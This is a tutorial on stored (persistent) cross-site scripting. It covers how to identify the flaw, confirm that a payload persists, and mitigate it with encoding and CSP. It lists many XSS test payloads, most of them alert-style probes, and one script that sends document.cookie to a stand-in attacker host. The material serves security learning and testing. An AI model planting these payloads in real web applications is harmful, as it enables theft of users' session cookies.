**Stored Cross‑Site Scripting (Stored XSS)**, also called **Persistent XSS**, occurs when a web application **stores malicious user input on the server** and later renders it in pages without proper sanitization or encoding.

The injected script becomes part of the application’s stored data and executes automatically when the page is loaded by users.

Since the payload is stored in the backend, every user visiting the affected page may trigger the script, which makes this vulnerability particularly dangerous.

---

## Identifying a Stored XSS

A common testing payload for verifying JavaScript execution:

```html
<script>alert(window.origin)</script>
```

> Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

---

## Alternative XSS Testing Payloads

Some environments restrict traditional alert dialogs, so testers often use alternative payloads to confirm injection.

```html
<script>alert(1)</script>
```

```html
<script>alert(document.cookie)</script>
```

```html
<script>print(1)</script>
```

```html
<plaintext>
```

```html
<img src=x onerror=alert(window.origin)>
```

```html
<svg onload=alert(window.origin)>
```

```html
<body onload=alert(window.origin)>
```

```html
<input autofocus onfocus=alert(window.origin)>
```

```html
<iframe src="javascript:alert(window.origin)">
```

```html
<details open ontoggle=alert(window.origin)>
```

```html
<script>confirm(window.origin)</script>
```

```html
<script>prompt(window.origin)</script>
```

```html
<script>
fetch("http://attacker.com/?cookie="+document.cookie)
</script>
```

---

## Confirming the Vulnerability is Persistent

To verify that the vulnerability is truly **stored on the backend**, the payload must remain after a page refresh.

Typical verification process:

- Inject the payload into a form
    
- Submit the form
    
- Reload the page
    

If the script executes again after refreshing the page, it confirms that the payload was **stored in the backend**.


---

## Mitigation

Preventing Stored XSS requires proper handling of user input and safe output rendering.

Key defensive practices include:

- Validate and restrict input data
    
- Encode user content before rendering it in HTML
    
- Avoid inserting raw user input into scripts or HTML attributes
    
- Implement Content Security Policy (CSP) headers
    
- Use templating frameworks that automatically escape output
    

Example CSP header:

```http
Content-Security-Policy: default-src 'self'
```

CSP reduces the impact of XSS by restricting where scripts can be loaded from.
